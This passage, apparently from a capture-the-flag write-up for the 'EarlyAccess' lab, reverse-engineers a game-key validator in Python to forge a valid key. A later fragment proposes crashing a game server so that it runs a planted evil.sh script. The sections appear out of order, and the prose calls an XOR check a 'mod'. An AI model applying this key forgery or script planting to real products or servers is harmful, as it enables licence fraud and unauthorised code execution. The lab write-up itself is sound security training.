valid.\nValid second group could be: 1J1I1\ndef g2_valid(self) -&gt; bool:\n        g2 = self.key.split('-')[1]\n        p1 = g2[::2]\n        p2 = g2[1::2]\n        return sum(bytearray(p1.encode())) == sum(bytearray(p2.encode()))\n&gt;&gt;&gt; g2 = \"12345\"\n&gt;&gt;&gt; p1 = g2[::2]\n&gt;&gt;&gt; print(p1)\n135\n&gt;&gt;&gt; p2 = g2[1::2]\n&gt;&gt;&gt; print(p2)\n24\n&gt;&gt;&gt; p1 = \"1\"\n&gt;&gt;&gt; print(p1.encode())\nb'1'\n&gt;&gt;&gt; print(sum(p1.encode()))\n49\n&gt;&gt;&gt; 49*3\n147\n&gt;&gt;&gt; p2 = \"J\"\n&gt;&gt;&gt; print(p2.encode())\nb'J'\n&gt;&gt;&gt; print(sum(p2.encode()))\n74\n&gt;&gt;&gt; g2 = \"1J1I1\"\n&gt;&gt;&gt; p1 = g2[::2]\n&gt;&gt;&gt; p2 = g2[1::2]\n&gt;&gt;&gt; print(sum(bytearray(p1.encode())))\n147\n&gt;&gt;&gt; print(sum(bytearray(p2.encode())))\n147\nFifth section (third group) checks if the first two characters of the groups are equal to magic_value which is statically assigned to XP, at the start of the code. If the first check passes, then the whole group is check to see if it’s total decimal value (sum) is equal to magic_num, which is statically assigned to 346, at the start of the code.\nThe ASCII decimal value of XP is 168, meaning our three remaining characters should have a combined value of 178.\nKeep note that third group needs to follow the format: [A-Z]{4}[0-9]\nValid third group could be: XPAA0\ndef g3_valid(self) -&gt; bool:\n        # TODO: Add mechanism to sync magic_num with API\n        g3 = self.key.split('-')[2]\n        if g3[0:2] == self.magic_value:\n            return sum(bytearray(g3.encode())) == self.magic_num\n        else:\n            return False\n&gt;&gt;&gt; g3 = \"12345\"\n&gt;&gt;&gt; print(g3[0:2])\n12\n&gt;&gt;&gt; start = \"XP\"\n&gt;&gt;&gt; print(sum(start.encode()))\n168\n&gt;&gt;&gt; 346-168\n178\n&gt;&gt;&gt; end = \"AA0\"\n&gt;&gt;&gt; print(sum(end.encode()))\n178\nSixth section (fourth group) compares the first group with the fourth group, character by character, converts it to ASCII decimal and calculates the mod value of the two. The mod value must be equal to 12, 4, 20, 117, 0.\nValid fourth group could be: GAME1\ndef g4_valid(self) -&gt; bool:\n        return [ord(i)^ord(g) for g, i in zip(self.key.split('-')[0], self.key.split('-')[3])] == [12, 4, 20, 117, 0]\n&gt;&gt;&gt; print(ord(\"K\"))\n75\n&gt;&gt;&gt; print(ord(\"G\"))\n71\n&gt;&gt;&gt; print(ord(\"K\")^ord(\"G\"))\n12\n&gt;&gt;&gt; print(ord(\"E\"))\n69\n&gt;&gt;&gt; print(ord(\"A\"))\n65\n&gt;&gt;&gt; print(ord(\"E\")^ord(\"A\"))\n4\n&gt;&gt;&gt; print(ord(\"Y\"))\n89\n&gt;&gt;&gt; print(ord(\"M\"))\n77\n&gt;&gt;&gt; print(ord(\"Y\")^ord(\"M\"))\n20\n&gt;&gt;&gt; print(ord(\"0\"))\n48\n&gt;&gt;&gt; print(ord(\"E\"))\n69\n&gt;&gt;&gt; print(ord(\"0\")^ord(\"E\"))\n117\n&gt;&gt;&gt; print(ord(\"1\")^ord(\"1\"))\n0\nChecksum verification (fifth group) is done by comparing the combined ASCII decimal sum of the four first groups, compared to the value of the fifth group.\ndef calc_cs(self) -&gt; int:\n        gs = self.key.split('-')[:-1]\n        return sum([sum(bytearray(g.encode())) for g in gs])\n\ndef cs_valid(self) -&gt; bool:\n        cs = int(self.key.split('-')[-1])\n        return self.calc_cs() == cs\n&gt;&gt;&gt; key = \"KEY01-1J1I1-XPAA0-GAME1-1301\"\n&gt;&gt;&gt; gs = key.split('-')[:-1]\n&gt;&gt;&gt; print(gs)\n['KEY01', '1J1I1', 'XPAA0', 'GAME1']\n&gt;&gt;&gt; print(sum([sum(bytearray(g.encode())) for g in gs]))\n1301\n&gt;&gt;&gt; cs = int(key.split('-')[-1])\n&gt;&gt;&gt; print(cs)\n1301\nA valid key should be: KEY01-1J1I1-XPAA0-GAME1-1301\nTesting it out, and we’ve reversed a key!\n┌──(void㉿void)-[/git/htb/earlyaccess]\n└─$ python3 validate.py KEY01-1J1I1-XPAA0-GAME1-1301\nEntered key is valid!\n\n\n\nStep 4\nEven though the key is correct in our offline validator, it fails when validating it online. This probably have something to do with this. &gt;Since the API has been down a lot lately, we have come up with an temporary solution. As requested, an offline backup of the game-key validator algorithm is now available to all administrative users. To use this, the magic_num must be entered into the validator app.\nAnd in the code we find: magic_num = 346 # TODO: Sync with API (api generates magic_num every 30min)\n![[earlyaccess-03.png]]\nWe need to find a way to extract the magic_num value from the API, or by other means. After trying to find and/or extract the magic_num for a while without success, I decided to go the scripting route and brute force all possible keys.

in /var/mail/drew &gt;To: drew@earlyaccess.htb Subject: Game-server crash fixes From: game-adm game-adm@earlyaccess.htb Date: Thu May 27 8:10:34 2021 &gt; Hi Drew! &gt; Thanks again for taking the time to test this very early version of our newest project! We have received your feedback and implemented a healthcheck that will automatically restart the game-server if it has crashed (sorry for the current instability of the game! We are working on it…) If the game hangs now, the server will restart and be available again after about a minute. &gt; If you find any other problems, please don’t hesitate to report them! &gt; Thank you for your efforts! Game-adm (and the entire EarlyAccess Studios team).\nMy guess here is that we should crash the game server, thus restarting the service and running scripts in /opt/docker-entrypoint.d/ - where we will put our own evil.sh script.\n\n\n\nStep 2\nSo we’re looking for a game-server.
